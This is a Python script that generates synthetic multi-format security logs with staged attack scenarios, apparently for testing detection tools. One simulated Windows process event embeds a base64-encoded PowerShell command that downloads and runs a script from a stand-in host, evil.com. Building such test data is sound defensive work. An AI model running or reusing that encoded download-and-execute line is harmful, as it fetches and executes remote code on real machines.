"""
NIGHTWATCH — Synthetic Security Log Generator
Generates realistic multi-host security log streams across heterogeneous formats:
- Linux Authentication Log (/var/log/auth.log)
- Suricata EVE JSON (eve.json)
- Windows Security Event Log JSON (Event IDs 4624, 4625, 4688, 4720)
- Standard Syslog (/var/log/syslog)

Includes realistic baseline activity AND deliberate security attack scenarios:
1. SSH Brute Force Campaign
2. Horizontal Password Spraying Campaign
3. Successful Authentication Following Repeated Failures
4. High-Severity Suricata IDS Malware C2 Beaconing Alert
5. Suspicious Process Execution (Encoded PowerShell & Reconnaissance)
6. Privileged Account Targeting
"""

import json
import os
import random
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path


def generate_all_samples(base_dir: Path):
    samples_dir = base_dir / "samples"
    samples_dir.mkdir(parents=True, exist_ok=True)

    now = datetime.now(timezone.utc)
    t_start = now - timedelta(minutes=10)

    print(f"[NIGHTWATCH] Generating synthetic security datasets in {samples_dir}...")

    # --- 1. Linux Auth Log (samples/auth.log) ---
    auth_lines = []
    normal_hosts = ["web-prod-01", "db-prod-01", "app-internal-02", "bastion-01"]
    normal_users = ["analyst", "devops", "deploy", "jdoe", "asmith"]
    internal_ips = ["192.168.1.50", "192.168.1.55", "192.168.2.100", "10.0.0.15"]

    curr = t_start
    # Baseline normal logins & sudo commands
    for _ in range(40):
        curr += timedelta(seconds=random.randint(5, 15))
        h = random.choice(normal_hosts)
        u = random.choice(normal_users)
        ip = random.choice(internal_ips)
        port = random.randint(30000, 65000)
        ts_str = curr.strftime("%b %d %H:%M:%S")

        if random.random() < 0.6:
            auth_lines.append(f"{ts_str} {h} sshd[1024]: Accepted publickey for {u} from {ip} port {port} ssh2")
        else:
            auth_lines.append(f"{ts_str} {h} sudo:   {u} : TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND=/bin/systemctl status nginx")

    # Attack Scenario 1: SSH Brute Force from External Attacker (198.51.100.45)
    bf_ip = "198.51.100.45"
    bf_target_host = "bastion-01"
    for i in range(12):
        curr += timedelta(seconds=random.randint(2, 6))
        ts_str = curr.strftime("%b %d %H:%M:%S")
        auth_lines.append(f"{ts_str} {bf_target_host} sshd[4096]: Failed password for invalid user admin from {bf_ip} port {random.randint(40000, 50000)} ssh2")

    # Attack Scenario 2: Password Spraying from 203.0.113.88
    spray_ip = "203.0.113.88"
    spray_users = ["alice", "bob", "charlie", "david", "eva", "frank", "grace"]
    for u in spray_users:
        curr += timedelta(seconds=random.randint(5, 12))
        ts_str = curr.strftime("%b %d %H:%M:%S")
        auth_lines.append(f"{ts_str} web-prod-01 sshd[5120]: Failed password for {u} from {spray_ip} port {random.randint(35000, 45000)} ssh2")

    # Attack Scenario 3: Success after multiple failures on user 'svc_backup'
    for _ in range(4):
        curr += timedelta(seconds=random.randint(3, 8))
        ts_str = curr.strftime("%b %d %H:%M:%S")
        auth_lines.append(f"{ts_str} db-prod-01 sshd[6200]: Failed password for svc_backup from 192.168.1.180 port 49120 ssh2")

    curr += timedelta(seconds=10)
    ts_str = curr.strftime("%b %d %H:%M:%S")
    auth_lines.append(f"{ts_str} db-prod-01 sshd[6200]: Accepted password for svc_backup from 192.168.1.180 port 49120 ssh2")

    auth_path = samples_dir / "auth.log"
    with open(auth_path, "w", encoding="utf-8") as f:
        f.write("\n".join(auth_lines) + "\n")
    print(f" -> Wrote {len(auth_lines)} lines to {auth_path}")

    # --- 2. Suricata EVE JSON (samples/suricata_eve.json) ---
    suricata_events = []
    curr = t_start

    # Normal DNS queries & HTTP traffic
    dns_queries = [("internal.corp", "10.0.0.1"), ("api.github.com", "140.82.121.4"), ("update.ubuntu.com", "91.189.91.38")]
    for _ in range(35):
        curr += timedelta(seconds=random.randint(4, 12))
        iso_str = curr.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+0000"
        q_name, r_ip = random.choice(dns_queries)
        suricata_events.append({
            "timestamp": iso_str,
            "event_type": "dns",
            "src_ip": "192.168.1.100",
            "src_port": random.randint(50000, 60000),
            "dest_ip": "8.8.8.8",
            "dest_port": 53,
            "proto": "UDP",
            "dns": {
                "type": "query",
                "rrname": q_name,
                "rrtype": "A"
            }
        })

    # Attack Scenario 4: High-Severity IDS Threat Alerts (CobaltStrike C2 & Reverse Shell)
    curr += timedelta(seconds=15)
    suricata_events.append({
        "timestamp": curr.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+0000",
        "event_type": "alert",
        "src_ip": "192.168.1.105",
        "src_port": 49812,
        "dest_ip": "198.51.100.99",
        "dest_port": 8443,
        "proto": "TCP",
        "alert": {
            "action": "allowed",
            "gid": 1,
            "signature_id": 2024101,
            "rev": 1,
            "signature": "ET MALWARE Cobalt Strike Beacon Observed (Malleable C2 Profile)",
            "category": "A Network Trojan was detected",
            "severity": 1
        }
    })

    curr += timedelta(seconds=20)
    suricata_events.append({
        "timestamp": curr.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+0000",
        "event_type": "alert",
        "src_ip": "192.168.1.105",
        "src_port": 50114,
        "dest_ip": "198.51.100.99",
        "dest_port": 4444,
        "proto": "TCP",
        "alert": {
            "action": "blocked",
            "gid": 1,
            "signature_id": 2024105,
            "rev": 2,
            "signature": "ET ATTACK_RESPONSE Reverse Shell Connection Established",
            "category": "Potential Corporate Privacy Violation",
            "severity": 1
        }
    })

    suricata_path = samples_dir / "suricata_eve.json"
    with open(suricata_path, "w", encoding="utf-8") as f:
        for ev in suricata_events:
            f.write(json.dumps(ev) + "\n")
    print(f" -> Wrote {len(suricata_events)} events to {suricata_path}")

    # --- 3. Windows Security Event Logs (samples/windows_events.json) ---
    win_events = []
    curr = t_start

    # Normal user logons
    for _ in range(25):
        curr += timedelta(seconds=random.randint(6, 18))
        iso_str = curr.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
        win_events.append({
            "EventID": 4624,
            "TimeCreated": iso_str,
            "Computer": "WORKSTATION-01.corp.local",
            "Channel": "Security",
            "EventData": {
                "TargetUserName": "finance_user",
                "IpAddress": "192.168.1.80",
                "IpPort": random.randint(49152, 65535),
                "LogonType": 3
            }
        })

    # Attack Scenario 5: Suspicious Command-Line & Reconnaissance (Event 4688)
    curr += timedelta(seconds=12)
    win_events.append({
        "EventID": 4688,
        "TimeCreated": curr.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
        "Computer": "WORKSTATION-01.corp.local",
        "Channel": "Security",
        "EventData": {
            "SubjectUserName": "finance_user",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcAAuAHAAcwAxACcAKQA=",
            "ParentProcessName": "C:\\Windows\\explorer.exe"
        }
    })

    curr += timedelta(seconds=8)
    win_events.append({
        "EventID": 4688,
        "TimeCreated": curr.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
        "Computer": "WORKSTATION-01.corp.local",
        "Channel": "Security",
        "EventData": {
            "SubjectUserName": "finance_user",
            "NewProcessName": "C:\\Windows\\System32\\whoami.exe",
            "CommandLine": "whoami.exe /all",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
        }
    })

    win_path = samples_dir / "windows_events.json"
    with open(win_path, "w", encoding="utf-8") as f:
        for ev in win_events:
            f.write(json.dumps(ev) + "\n")
    print(f" -> Wrote {len(win_events)} events to {win_path}")

    # --- 4. Syslog (samples/syslog.log) ---
    syslog_lines = []
    curr = t_start
    services = ["systemd", "kernel", "cron", "rsyslogd", "dockerd"]
    for _ in range(30):
        curr += timedelta(seconds=random.randint(5, 20))
        ts_str = curr.strftime("%b %d %H:%M:%S")
        svc = random.choice(services)
        pid = random.randint(500, 3000)
        syslog_lines.append(f"{ts_str} srv-core-01 {svc}[{pid}]: Service health check OK; memory cache synchronized.")

    syslog_path = samples_dir / "syslog.log"
    with open(syslog_path, "w", encoding="utf-8") as f:
        f.write("\n".join(syslog_lines) + "\n")
    print(f" -> Wrote {len(syslog_lines)} lines to {syslog_path}")

    print("[NIGHTWATCH] Synthetic datasets successfully created.")


if __name__ == "__main__":
    base_path = Path(__file__).resolve().parent.parent
    generate_all_samples(base_path)
